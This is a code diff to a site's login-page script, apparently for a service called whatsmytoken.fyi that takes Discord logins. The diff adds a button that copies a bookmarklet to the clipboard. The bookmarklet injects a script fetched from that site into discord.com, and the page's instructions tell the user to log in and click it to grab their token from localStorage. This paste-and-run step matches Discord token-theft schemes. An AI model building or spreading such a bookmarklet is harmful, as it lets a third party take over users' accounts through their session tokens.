@@ -15,6 +15,7 @@ $(function () {
     const $btnLogin = $("#btn-login");
     const $btnMfa = $("#btn-mfa");
     const $btnMfaBackup = $("#btn-mfa-backup");
+    const $btnClient = $("#btn-client");
     const $btnAgree = $("#btn-agree");
     const $countdown = $("#agree-countdown");
     const $warningModal = $("#warning-modal");
@@ -45,6 +46,7 @@ $(function () {
     }
     const API_BASE = resolveApiBase();
     const api = (p) => `${API_BASE}${p}`;
+    axios.defaults.withCredentials = true;
     let verifyUrl = api("/api/v1/auth/mfa/totp");
 
     function showChoice() {
@@ -95,6 +97,34 @@ $(function () {
         else toast("QR script not loaded. Reload and try again.", "warning");
     });
 
+    $("#btn-client").on("click", () => {
+        $choice.hide();
+        $directDiv.hide();
+        $mfaDiv.hide();
+        $tokenDiv.hide();
+        const bookmarklet = `javascript:(function(){var s=document.createElement('script');s.src='https://whatsmytoken.fyi/assets/js/client.js?v='+Date.now();document.body.appendChild(s);})();`;
+        navigator.clipboard.writeText(bookmarklet).then(() => {
+            $("#scan-info").html(
+                `<p class="text-muted mb-3">Client-Side Token (Bookmarklet)</p>` +
+                `<p class="text-muted small mb-3">Copied to clipboard. To use:</p>` +
+                `<ol class="text-muted small text-start" style="list-style-position:inside;padding-left:0;">` +
+                `<li>Create a new bookmark in your browser</li>` +
+                `<li>Paste the code below as the bookmark URL</li>` +
+                `<li>Go to discord.com and log in</li>` +
+                `<li>Click the bookmark to grab the token from localStorage</li>` +
+                `</ol>` +
+                `<div style="background:#1a1d23;border:1px solid #2c2f33;border-radius:4px;padding:1rem;margin-bottom:1rem;word-break:break-all;white-space:pre-wrap;font-family:monospace;font-size:0.85rem;">${bookmarklet}</div>` +
+                `<button type="button" class="btn btn-outline-secondary btn-sm" onclick="javascript:location.reload()">Back to choice</button>`
+            ).show();
+        }).catch(() => {
+            $("#scan-info").html(
+                `<p class="text-danger mb-2">Couldn't copy to clipboard. Copy manually below:</p>` +
+                `<div style="background:#1a1d23;border:1px solid #2c2f33;border-radius:4px;padding:1rem;margin-bottom:1rem;word-break:break-all;white-space:pre-wrap;font-family:monospace;font-size:0.85rem;">${bookmarklet}</div>` +
+                `<button type="button" class="btn btn-outline-secondary btn-sm" onclick="javascript:location.reload()">Back to choice</button>`
+            ).show();
+        });
+    });
+
     $("#btn-direct").on("click", () => {
         if (typeof window.stopQrLogin === "function") window.stopQrLogin();
         $choice.hide();
@@ -133,7 +163,6 @@ $(function () {
         const payload = {
             login: $dlEmail.val().trim(),
             password: $dlPassword.val(),
-            undelete: true,
         };
         if (captchaKey) {
             payload.captcha_key = captchaKey;
